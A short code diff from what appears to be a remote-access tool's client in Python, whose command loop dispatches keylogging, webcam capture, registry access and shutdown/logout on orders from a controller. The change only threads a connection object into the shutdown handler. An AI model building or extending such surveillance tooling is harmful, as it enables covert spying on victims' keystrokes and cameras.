@@ -23,9 +23,9 @@ def keylogger():
     kl.keylog(client)
     return
 
-def shutdown_logout(msg):
+def shutdown_logout(conn, msg):
     global client
-    sl.shutdown_logout(msg)
+    sl.shutdown_logout(conn, msg)
     return
 
 def mac_address():
@@ -93,7 +93,7 @@ def Connect():
         elif "REGISTRY" in msg:
             registry()
         elif "SHUTDOWN" in msg or "LOGOUT" in msg or "RESTART" in msg:
-            shutdown_logout(msg)
+            shutdown_logout(client, msg)
         elif "WEBCAM" in msg:
             webcam()
         elif "QUIT" in msg:
